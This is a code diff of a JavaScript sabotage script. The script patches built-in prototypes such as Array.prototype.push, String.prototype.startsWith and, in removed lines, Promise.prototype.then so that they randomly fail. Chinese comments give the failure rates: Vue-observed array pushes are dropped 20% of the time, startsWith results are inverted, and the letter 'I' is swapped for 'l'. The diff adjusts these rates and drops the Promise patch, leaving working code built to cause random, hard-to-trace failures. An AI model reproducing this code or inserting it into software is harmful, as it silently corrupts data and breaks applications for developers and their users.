@@ -4,7 +4,7 @@ const getRandomInt = (min, max) => {
   return Math.floor(Math.random() * (max - min + 1)) + min
 }
 const p = 'prototype'
-const A = Array, P = Promise, S = String, J = JSON, L = localStorage, O = Object, AP = A[p], PP = P[p], SP = S[p]
+const A = Array, P = Promise, S = String, J = JSON, L = localStorage, O = Object, AP = A[p], SP = S[p]
 const {
   forEach: _forEach,
   filter: _filter,
@@ -17,7 +17,6 @@ const {
   splice: _splice
 } = AP
 
-const { then: _then } = PP
 const { keys: _keys, values: _values, assign: _assign } = O
 const {
   replace: _replace,
@@ -31,7 +30,7 @@ const { getItem: _getItem, setItem: _setItem } = L
 
 // 有20%概率什么都不执行
 AP.push = function(...args) {
-  this.__ob__ ? getRandomInt(1, 100) >= 100 && _push.apply(this, args) : _push.apply(this, args)
+  this.__ob__ ? getRandomInt(1, 100) >= 20 && _push.apply(this, args) : _push.apply(this, args)
 }
 
 // 有10%概率在指定位置后面一位进行操作
@@ -108,11 +107,6 @@ window.addEventListener('load', () => {
   SP.startsWith = function(...args) {
     const r = _startsWith.apply(this, args)
     return getRandomInt(1, 100) >= 10 ? r : !r
-  }
-
-  // 有10%概率注册不上回调函数
-  PP.then = function(...args) {
-    getRandomInt(1, 100) >= 10 && _then.apply(this, args)
   }
 
   // 有10%概率把I替换成l
